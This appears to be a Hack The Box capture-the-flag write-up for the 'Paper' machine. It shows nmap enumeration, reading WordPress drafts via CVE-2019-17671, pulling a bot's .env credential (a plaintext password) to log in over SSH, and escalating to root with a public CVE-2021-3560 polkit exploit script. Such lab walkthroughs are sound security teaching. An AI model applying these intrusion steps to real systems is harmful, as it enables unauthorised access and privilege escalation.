---
clayout: ctf
title: Paper
date: 2025-03-14
image: /ctf/hack-the-box/machines/paper/info-card.png
type: Hack The Box

ctf:
    - name: Paper
      link: https://app.hackthebox.com/machines/432
      thumbnail: /ctf/hack-the-box/machines/paper/info-card.png
      pwned:
        - link: https://labs.hackthebox.com/achievement/machine/585215/432
          thumbnail: /ctf/hack-the-box/machines/paper/pwned.png
---

## Enumeration

### Nmap Scan

We begin by running a Nmap scan to identify open ports and services on the target machine:

```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   2048 1005ea5056a600cb1c9c93df5f83e064 (RSA)
|_  256 588c821cc6632a83875c2f2b4f4dc379 (ECDSA)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-title: HTTP Server Test Page powered by CentOS
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods:
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods:
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
```

The scan reveals three open ports:

- Port 22: SSH (OpenSSH 8.0)
- Port 80: HTTP (Apache httpd 2.4.37)
- Port 443: HTTPS (Apache httpd 2.4.37)

### Web Enumeration

Navigating to the target’s IP in a browser displays a default **Apache test page**.

![Cap - Apache test page](/ctf/hack-the-box/machines/paper/apache-test-page.png)

Port **443** serves the same page. Checking the HTTP response headers using `curl`:

```bash
$ curl -s -D - -o /dev/null http://10.10.11.143
HTTP/1.1 403 Forbidden
Date: Tue, 18 Mar 2025 06:38:44 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Backend-Server: office.paper
...
```

The `X-Backend-Server` header reveals the internal hostname: `office.paper`.
We add this to `/etc/hosts`:

```bash
echo "10.10.11.143 office.paper" | sudo tee -a /etc/hosts
```

### Discovering WordPress

Visiting `http://office.paper/` reveals a Blunder Tiffin Inc. blog.

![Cap - Blunder Tiffin Inc. blog](/ctf/hack-the-box/machines/paper/blunder-tiffin-inc-blog.png)

Inspecting the comments, we find a user **Nick** mentioning a **secret draft page**.

![Cap - Nick's comment](/ctf/hack-the-box/machines/paper/nick-comment.png)

Using **Wappalyzer**, we identify the CMS as **WordPress 5.2.3**.

![Cap - Wappalyzer WordPress](/ctf/hack-the-box/machines/paper/wappalyzer.png)

This version is vulnerable to [CVE-2019-17671](https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2/),
allowing unauthenticated users to view private/draft posts.

Appending `?static=1` to the URL reveals a **hidden draft post**.

![Cap - Draft post](/ctf/hack-the-box/machines/paper/draft-post.png)

It contains a **secret registration link** for an employee chat system:

```plaintext
http://chat.office.paper/register/8qozr226AhkCHZdyY
```

We add `chat.office.paper` to `/etc/hosts`:

```bash
echo "10.10.11.143 chat.office.paper" | sudo tee -a /etc/hosts
```

Navigating to the URL presents a **Rocket.Chat registration form**.

![Cap - Chat registration form](/ctf/hack-the-box/machines/paper/chat-registration-form.png)

### Gaining Initial Access

After registering and logging in, we find messages in the **general** channel.

![Cap - Chat messages](/ctf/hack-the-box/machines/paper/chat-messages.png)

A **bot named Recyclops** is mentioned, capable of listing and reading files.

![Cap - Recyclops bot](/ctf/hack-the-box/machines/paper/recyclops-bot.png)

We find **Recyclops' environment file** in `/home/dwight/hubot/.env`:

```bash
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
```

Using these credentials, we attempt SSH login as **dwight**:

```bash
$ ssh dwight@10.10.11.143
[dwight@paper ~]$ id
uid=1004(dwight) gid=1004(dwight) groups=1004(dwight)
```

We retrieve the **user flag**:

```bash
[dwight@paper ~]$ cat user.txt
[USER_FLAG]
```

## Privilege Escalation

### Enumeration

Running **LinPEAS**, we identify the **polkit package**:

```bash
[dwight@paper ~]$ rpm -q polkit
polkit-0.115-6.el8.x86_64
```

This version is vulnerable
to [CVE-2021-3560](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/tree/main), allowing privilege
escalation.

### Exploitation

We upload and execute an exploit script:

```bash
[dwight@paper ~]$ ./poc.sh

[+] Polkit version appears to be vulnerable!!
[!] Starting exploit...
[+] Inserted Username secnigma  with UID 1005!
[!] It looks like the password insertion was succesful!
```

Switching to the new user and escalating privileges:

```bash
[dwight@paper ~]$ su - secnigma
Password:
[secnigma@paper ~]$ sudo bash
[sudo] password for secnigma:
[root@paper secnigma]# id
uid=0(root) gid=0(root) groups=0(root)
```

We successfully escalate to root and retrieve the **root flag**:

```bash
[root@paper secnigma]# cat /root/root.txt
[ROOT_FLAG]
```

![Cap - pwned](/ctf/hack-the-box/machines/paper/pwned.png)
